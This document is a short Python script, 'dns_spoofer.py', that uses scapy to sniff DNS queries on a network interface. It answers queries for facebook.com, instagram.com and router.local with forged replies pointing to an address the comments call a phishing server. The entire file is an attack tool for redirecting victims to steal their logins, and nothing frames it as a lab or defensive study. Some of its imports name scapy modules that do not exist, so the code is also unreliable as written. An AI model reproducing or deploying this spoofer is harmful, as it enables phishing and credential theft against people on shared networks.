# dns_spoofer.py
import scapy.all as scapy
from scapy.layers import dns, udp, ip
from socket import gethostbyname
import sys

# Target domains to spoof
SPOOF_DOMAINS = ["facebook.com", "instagram.com", "router.local"]
SPOOF_IP = "192.168.1.66"  # your phishing server IP

def process_packet(pkt):
    if pkt.haslayer(dns.DNSQR):  # DNS Question Record
        queried_domain = pkt[dns.DNSQR].qname.decode().rstrip(".")
        print(f"[📡] DNS Request: {queried_domain}")

        for target in SPOOF_DOMAINS:
            if target in queried_domain:
                print(f"[🎯] Spoofing {queried_domain} → {SPOOF_IP}")
                spoofed_pkt = (
                    ip.IP(dst=pkt[ip.IP].src, src=pkt[ip.IP].dst) /
                    udp.UDP(dport=pkt[udp.UDP].sport, sport=53) /
                    dns.DNS(
                        id=pkt[dns.DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[dns.DNS].qd,
                        an=dns.DNSRR(rrname=pkt[dns.DNSQR].qname, rdata=SPOOF_IP)
                    )
                )
                scapy.send(spoofed_pkt, verbose=0)
                break

def start_sniff(interface):
    print(f"[🚀] DNS Spoofer running on {interface}")
    scapy.sniff(filter="udp port 53", iface=interface, store=False, prn=process_packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <interface>")
        exit()
    start_sniff(sys.argv[1])
